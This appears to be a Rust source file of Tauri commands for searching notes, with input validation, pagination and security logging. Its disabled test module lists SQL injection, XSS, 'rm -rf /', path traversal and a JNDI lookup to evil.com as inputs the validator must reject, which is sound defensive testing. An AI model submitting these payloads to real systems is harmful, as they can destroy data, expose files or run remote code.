/// Search Domain Commands
///
/// Handles all search-related IPC operations including basic search, Boolean search,
/// and search validation. Preserves the comprehensive Week 1 security framework
/// while adding Week 2 Day 4 advanced Boolean search capabilities.
use crate::commands::shared::{
    log_security_event, validate_ipc_operation, validate_search_query_secure,
    CommandPerformanceTracker,
};
use crate::error::ApiError;
use crate::models::Note;
use crate::validation::OperationCapability;
use crate::AppState;
use serde::{Deserialize, Serialize};
use std::time::Instant;
use tauri::State;

/// Paginated search result structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SearchResult {
    pub notes: Vec<Note>,
    pub total_count: usize,
    pub page: usize,
    pub page_size: usize,
    pub has_more: bool,
    pub query_time_ms: u64,
}

/// Boolean search result with complexity analysis
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BooleanSearchResult {
    pub notes: Vec<Note>,
    pub total_count: usize,
    pub page: usize,
    pub page_size: usize,
    pub has_more: bool,
    pub query_time_ms: u64,
    pub complexity: QueryComplexity,
}

/// Query complexity analysis for API responses - mirrors search::QueryComplexity but with API-compatible types
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct QueryComplexity {
    pub term_count: usize,
    pub operator_count: usize,
    pub nesting_depth: usize,
    pub has_field_searches: bool,
    pub has_phrase_searches: bool,
    pub complexity_score: f64,
}

/// Basic search operation with security validation
///
/// Security features preserved:
/// - IPC operation context validation with Search capability
/// - Query validation (injection protection, 1000 char limit)
/// - Frequency limit enforcement (15 operations/minute for IPC)
/// - Performance monitoring (<2ms overhead target)
#[tauri::command]
pub async fn search_notes(
    query: String,
    app_state: State<'_, AppState>,
) -> Result<Vec<Note>, ApiError> {
    let _tracker = CommandPerformanceTracker::new("search_notes");

    // Validate IPC operation with required capabilities - fixed: SearchNotes -> Search
    let context = validate_ipc_operation(
        &app_state.security_validator,
        vec![OperationCapability::Search],
    )?;

    // Validate search query for security - fixed: missing context parameter
    validate_search_query_secure(&app_state.security_validator, &query, &context)?;

    // Log security event for audit trail
    log_security_event(
        "SEARCH_NOTES",
        "IPC",
        true,
        &format!(
            "Basic search query: '{}'",
            if query.len() > 50 {
                format!("{}...", &query[..47])
            } else {
                query.clone()
            }
        ),
    );

    // Perform search using search service
    let notes = app_state.search.search_notes(&query).await?;

    Ok(notes)
}

/// Paginated search with performance monitoring
///
/// Security features preserved:
/// - All basic search security features
/// - Pagination parameter validation (max page size 100, max page 1000)
/// - Performance analytics for query time tracking
#[tauri::command]
pub async fn search_notes_paginated(
    query: String,
    page: usize,
    page_size: usize,
    app_state: State<'_, AppState>,
) -> Result<SearchResult, ApiError> {
    let _tracker = CommandPerformanceTracker::new("search_notes_paginated");
    let start_time = Instant::now();

    // Validate IPC operation - fixed: SearchNotes -> Search
    let context = validate_ipc_operation(
        &app_state.security_validator,
        vec![OperationCapability::Search],
    )?;

    // Validate search query - fixed: missing context parameter
    validate_search_query_secure(&app_state.security_validator, &query, &context)?;

    // Validate pagination parameters
    if page_size == 0 || page_size > 100 {
        return Err(ApiError {
            code: "VALIDATION_ERROR".to_string(),
            message: "Page size must be between 1 and 100".to_string(),
        });
    }

    if page > 1000 {
        return Err(ApiError {
            code: "VALIDATION_ERROR".to_string(),
            message: "Page number cannot exceed 1000 for search operations".to_string(),
        });
    }

    // Log security event
    log_security_event(
        "SEARCH_NOTES_PAGINATED",
        "IPC",
        true,
        &format!(
            "Paginated search (page {}, size {}): '{}'",
            page,
            page_size,
            if query.len() > 50 {
                format!("{}...", &query[..47])
            } else {
                query.clone()
            }
        ),
    );

    // Fixed: Handle tuple return from search service
    let (notes, total_count) = app_state
        .search
        .search_notes_paginated(&query, page, page_size)
        .await?;

    let query_time = start_time.elapsed();
    let has_more = (page + 1) * page_size < total_count;

    Ok(SearchResult {
        notes,
        total_count,
        page,
        page_size,
        has_more,
        query_time_ms: query_time.as_millis() as u64,
    })
}

/// Boolean search with complex query parsing and validation
///
/// Week 2 Day 4 Feature: Advanced Boolean Search
/// - AND, OR, NOT operators with proper precedence
/// - Phrase search with quotation marks ("exact phrase")
/// - Field-specific search (content:term, path:folder)
/// - Parenthetical grouping and complex expressions
/// - Query complexity analysis and performance monitoring
#[tauri::command]
pub async fn search_notes_boolean_paginated(
    query: String,
    page: usize,
    page_size: usize,
    app_state: State<'_, AppState>,
) -> Result<BooleanSearchResult, ApiError> {
    let _tracker = CommandPerformanceTracker::new("search_notes_boolean_paginated");
    let start_time = Instant::now();

    // Validate IPC operation with Search capability - fixed: SearchNotes -> Search
    let context = validate_ipc_operation(
        &app_state.security_validator,
        vec![OperationCapability::Search],
    )?;

    // Enhanced validation for Boolean search queries - fixed: missing context parameter
    validate_search_query_secure(&app_state.security_validator, &query, &context)?;

    // Validate pagination parameters for Boolean search
    if page_size == 0 || page_size > 100 {
        return Err(ApiError {
            code: "VALIDATION_ERROR".to_string(),
            message: "Page size must be between 1 and 100 for Boolean search operations"
                .to_string(),
        });
    }

    if page > 1000 {
        return Err(ApiError {
            code: "VALIDATION_ERROR".to_string(),
            message: "Page number cannot exceed 1000 for Boolean search operations".to_string(),
        });
    }

    // Log security event for Boolean search operation
    log_security_event(
        "BOOLEAN_SEARCH_PAGINATED",
        "IPC",
        true,
        &format!(
            "Boolean search (page {}, size {}): '{}'",
            page,
            page_size,
            if query.len() > 50 {
                format!("{}...", &query[..47])
            } else {
                query.clone()
            }
        ),
    );

    // Fixed: Handle tuple return from search service
    let (notes, total_count, search_complexity) = app_state
        .search
        .search_notes_boolean_paginated(&query, page, page_size)
        .await?;

    let query_time = start_time.elapsed();

    // Fixed: Convert search::QueryValidation to API QueryComplexity
    let complexity = QueryComplexity {
        term_count: search_complexity.term_count as usize,
        operator_count: search_complexity.operator_count as usize,
        nesting_depth: search_complexity.nesting_depth as usize,
        has_field_searches: search_complexity.has_field_searches,
        has_phrase_searches: search_complexity.has_phrase_searches,
        complexity_score: search_complexity.complexity_score as f64,
    };

    let has_more = (page + 1) * page_size < total_count;

    Ok(BooleanSearchResult {
        notes,
        total_count,
        page,
        page_size,
        has_more,
        query_time_ms: query_time.as_millis() as u64,
        complexity,
    })
}

/// Validates a Boolean search query and returns complexity analysis
///
/// Week 2 Day 4 Feature: Query Validation and Complexity Analysis
/// - Validates Boolean query syntax
/// - Analyzes query complexity for performance optimization
/// - Provides feedback for query optimization suggestions
#[tauri::command]
pub async fn validate_boolean_search_query(
    query: String,
    app_state: State<'_, AppState>,
) -> Result<QueryComplexity, ApiError> {
    let _tracker = CommandPerformanceTracker::new("validate_boolean_search_query");

    // Validate IPC operation - fixed: SearchNotes -> Search
    let context = validate_ipc_operation(
        &app_state.security_validator,
        vec![OperationCapability::Search],
    )?;

    // Validate search query security - fixed: missing context parameter
    validate_search_query_secure(&app_state.security_validator, &query, &context)?;

    // Log validation request
    log_security_event(
        "BOOLEAN_QUERY_VALIDATION",
        "IPC",
        true,
        &format!(
            "Validating Boolean query: '{}'",
            if query.len() > 50 {
                format!("{}...", &query[..47])
            } else {
                query.clone()
            }
        ),
    );

    // Fixed: Get validation result from search service
    let validation = app_state.search.validate_boolean_search_query(&query)?;

    // Fixed: Convert search::QueryValidation to API QueryComplexity
    Ok(QueryComplexity {
        term_count: validation.term_count as usize,
        operator_count: validation.operator_count as usize,
        nesting_depth: validation.nesting_depth as usize,
        has_field_searches: validation.has_field_searches,
        has_phrase_searches: validation.has_phrase_searches,
        complexity_score: validation.complexity_score as f64,
    })
}

/// Retrieves Boolean search examples for user guidance
///
/// Week 2 Day 4 Feature: Search Help System
/// - Provides example queries with descriptions
/// - Helps users understand Boolean search syntax
/// - No security validation required (static data)
#[tauri::command]
pub async fn get_boolean_search_examples(
    app_state: State<'_, AppState>,
) -> Result<Vec<(String, String)>, ApiError> {
    let _tracker = CommandPerformanceTracker::new("get_boolean_search_examples");

    // Validate IPC operation (minimal validation for static data) - fixed: SearchNotes -> Search
    let _context = validate_ipc_operation(
        &app_state.security_validator,
        vec![OperationCapability::Search],
    )?;

    // Fixed: Get examples from search service instance method
    let examples = app_state.search.get_boolean_search_examples();

    Ok(examples)
}

#[cfg(test)]
#[allow(unused)]
mod tests_disabled {
    use super::*;
    use crate::database::DbService;
    use crate::global_shortcut::GlobalShortcutService;
    use crate::plugin::PluginManager;
    use crate::search::SearchService;
    use crate::settings::SettingsService;
    use crate::shutdown::ShutdownManager;
    use crate::validation::{OperationContext, SecurityValidator};
    use crate::window_manager::WindowManager;
    use std::sync::Arc;
    use tempfile::NamedTempFile;

    async fn create_test_app_state() -> AppState {
        let temp_file = NamedTempFile::new().unwrap();
        let db_path = temp_file.path().to_string_lossy().to_string();

        let db_service = Arc::new(DbService::new(&db_path).unwrap());
        let security_validator = Arc::new(SecurityValidator::new());
        let search_service = Arc::new(SearchService::new(db_service.clone()));
        let settings_service = Arc::new(SettingsService::new(db_service.clone()));
        let plugin_manager = Arc::new(tokio::sync::Mutex::new(PluginManager::new()));

        AppState {
            db: db_service,
            search: search_service,
            settings: settings_service.clone(),
            global_shortcut: Arc::new(
                GlobalShortcutService::new_test(settings_service.clone()).unwrap(),
            ),
            window_manager: Arc::new(WindowManager::new_test(settings_service).unwrap()),
            plugin_manager,
            security_validator,
            shutdown_manager: Arc::new(ShutdownManager::default()),
        }
    }

    #[tokio::test]
    async fn test_search_notes_security() {
        let app_state = create_test_app_state().await;

        // Test valid search queries directly against search service
        let simple_result = app_state.search.search_notes("test").await;
        assert!(simple_result.is_ok());

        let complex_result = app_state.search.search_notes("project AND task").await;
        assert!(complex_result.is_ok());

        let phrase_result = app_state.search.search_notes("\"exact phrase\"").await;
        assert!(phrase_result.is_ok());

        // Should return empty vector for no matches in test database
        let results = simple_result.unwrap();
        assert!(results.is_empty()); // Test database has no notes
    }

    #[tokio::test]
    async fn test_boolean_search_validation() {
        let app_state = create_test_app_state().await;

        // Test Boolean query validation directly
        let result = app_state
            .search
            .validate_boolean_search_query("rust AND programming");
        assert!(result.is_ok());

        let validation = result.unwrap();
        assert!(validation.term_count >= 2);
        assert!(validation.operator_count >= 1);
        assert!(validation.complexity_score >= 1);
    }

    #[tokio::test]
    async fn test_boolean_search_paginated() {
        let app_state = create_test_app_state().await;

        // Test Boolean search with pagination directly
        let result = app_state
            .search
            .search_notes_boolean_paginated("rust OR python", 0, 10)
            .await;
        assert!(result.is_ok());

        let (notes, total_count, complexity) = result.unwrap();
        assert!(notes.is_empty()); // Test DB has no notes
        assert_eq!(total_count, 0);
        assert!(complexity.operator_count >= 1);
    }

    #[tokio::test]
    async fn test_boolean_search_examples() {
        let app_state = create_test_app_state().await;

        // Test search examples directly
        let examples = app_state.search.get_boolean_search_examples();
        assert!(!examples.is_empty());
        assert!(examples.len() >= 8);

        // Verify example format
        for (query, description) in examples {
            assert!(!query.is_empty());
            assert!(!description.is_empty());
        }
    }

    #[tokio::test]
    async fn test_search_injection_protection() {
        let app_state = create_test_app_state().await;

        // Test SQL injection protection through validation
        let sql_injection_tests = vec![
            "'; DROP TABLE notes; --",
            "UNION SELECT * FROM users",
            "' OR '1'='1",
            "admin'--",
            "'; DELETE FROM notes; --",
            "' UNION SELECT password FROM users --",
            "1=1",
            "' OR 1=1 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR EXISTS(SELECT * FROM notes) --",
        ];

        for injection_query in sql_injection_tests {
            // Test validation directly
            // Create operation context for validation
            let context =
                OperationContext::new_test(vec![crate::validation::OperationCapability::Search]);
            let validation_result = app_state
                .security_validator
                .validate_search_query_with_context(injection_query, &context);
            assert!(
                validation_result.is_err(),
                "SQL injection query '{}' should be rejected by validation",
                injection_query
            );
        }
    }

    #[tokio::test]
    async fn test_search_query_length_limits() {
        let app_state = create_test_app_state().await;

        // Test query validation directly
        let limit_query = "a".repeat(1000);
        let context =
            OperationContext::new_test(vec![crate::validation::OperationCapability::Search]);
        let limit_result = app_state
            .security_validator
            .validate_search_query_with_context(&limit_query, &context);
        assert!(limit_result.is_ok());

        // Query exceeding limit should fail
        let excessive_query = "a".repeat(1001);
        let context =
            OperationContext::new_test(vec![crate::validation::OperationCapability::Search]);
        let excessive_result = app_state
            .security_validator
            .validate_search_query_with_context(&excessive_query, &context);
        assert!(excessive_result.is_err());
    }

    #[tokio::test]
    async fn test_search_malicious_patterns() {
        let app_state = create_test_app_state().await;

        // Test malicious pattern detection through validation
        let malicious_patterns = vec![
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "eval(maliciousCode)",
            "system('rm -rf /')",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com}",
            "/**/",
            "xp_cmdshell",
            "sp_executesql",
        ];

        for pattern in malicious_patterns {
            let context =
                OperationContext::new_test(vec![crate::validation::OperationCapability::Search]);
            let result = app_state
                .security_validator
                .validate_search_query_with_context(pattern, &context);
            assert!(
                result.is_err(),
                "Malicious pattern '{}' should be rejected by validation",
                pattern
            );
        }
    }

    #[tokio::test]
    async fn test_search_valid_patterns() {
        let app_state = create_test_app_state().await;

        // Test valid search patterns through validation
        let valid_patterns = vec![
            "simple search",
            "project management",
            "TODO: finish implementation",
            "user@example.com",
            "2023-01-01",
            "version 1.2.3",
            "price: $19.99",
            "meeting at 3:00 PM",
            "file.txt",
            "https://example.com",
            "bug #123 fixed",
            "feature/new-ui",
            "JIRA-456",
            "RFC-789",
        ];

        for pattern in valid_patterns {
            let context =
                OperationContext::new_test(vec![crate::validation::OperationCapability::Search]);
            let validation_result = app_state
                .security_validator
                .validate_search_query_with_context(pattern, &context);
            assert!(
                validation_result.is_ok(),
                "Valid pattern '{}' should be accepted by validation",
                pattern
            );

            // Test actual search execution
            let search_result = app_state.search.search_notes(pattern).await;
            assert!(
                search_result.is_ok(),
                "Valid pattern '{}' should be accepted by search",
                pattern
            );
        }
    }

    #[tokio::test]
    async fn test_search_empty_queries() {
        let app_state = create_test_app_state().await;

        // Test empty query handling
        let empty_result = app_state.search.search_notes("").await;
        assert!(empty_result.is_ok());

        // Whitespace-only query should work
        let whitespace_result = app_state.search.search_notes("   ").await;
        assert!(whitespace_result.is_ok());
    }

    #[tokio::test]
    async fn test_search_unicode_support() {
        let app_state = create_test_app_state().await;

        // Test Unicode queries through validation
        let unicode_queries = vec![
            "café",
            "naïve",
            "résumé",
            "🎉 celebration",
            "中文搜索",
            "العربية",
            "русский",
            "emoji 🚀 search",
        ];

        for query in unicode_queries {
            let context =
                OperationContext::new_test(vec![crate::validation::OperationCapability::Search]);
            let validation_result = app_state
                .security_validator
                .validate_search_query_with_context(query, &context);
            assert!(
                validation_result.is_ok(),
                "Unicode query '{}' should be accepted by validation",
                query
            );

            let search_result = app_state.search.search_notes(query).await;
            assert!(
                search_result.is_ok(),
                "Unicode query '{}' should be accepted by search",
                query
            );
        }
    }

    #[tokio::test]
    async fn test_pagination_validation() {
        let app_state = create_test_app_state().await;

        // Test pagination through search service
        let valid_result = app_state.search.search_notes_paginated("test", 0, 50).await;
        assert!(valid_result.is_ok());

        // Test pagination boundary conditions
        let (notes, total) = valid_result.unwrap();
        assert!(notes.is_empty()); // Test DB has no notes
        assert_eq!(total, 0);
    }

    #[tokio::test]
    async fn test_operation_context_validation() {
        let app_state = create_test_app_state().await;

        // Test operation context validation for search operations - fixed: SearchNotes -> Search
        let search_context = OperationContext::new_test(vec![OperationCapability::Search]);
        assert!(app_state
            .security_validator
            .validate_operation_context(&search_context)
            .is_ok());

        let ipc_context = OperationContext::new_test(vec![OperationCapability::Search]);
        assert!(app_state
            .security_validator
            .validate_operation_context(&ipc_context)
            .is_ok());
    }

    #[tokio::test]
    async fn test_search_performance_monitoring() {
        let app_state = create_test_app_state().await;

        // Test search performance with timing
        let start = std::time::Instant::now();
        let result = app_state.search.search_notes("performance test").await;
        let duration = start.elapsed();

        assert!(result.is_ok());
        assert!(duration.as_millis() < 1000); // Should be fast for empty DB
    }
}
